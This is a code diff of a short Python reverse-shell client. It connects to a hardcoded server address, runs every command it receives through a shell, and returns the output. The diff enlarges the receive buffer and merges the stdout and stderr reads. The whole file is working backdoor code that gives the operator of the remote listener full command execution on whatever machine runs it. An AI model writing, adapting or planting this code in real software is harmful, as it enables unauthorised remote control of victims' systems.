@@ -1,5 +1,6 @@
 import socket
 import subprocess
+import time
 
 
 SERVER_IP = "192.168.1.37"
@@ -12,9 +13,9 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
     # data = s.recv(1024)
     
     while True:
-        command = s.recv(1024)
+        command = s.recv(999999999)
         command = command.decode()
         op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, stdin=subprocess.PIPE)
-        output = op.stdout.read()
-        output_error = op.stderr.read()
-        s.send(output + output_error)
+        output = op.stdout.read() + op.stderr.read()
+        # time.sleep()
+        s.send(output)
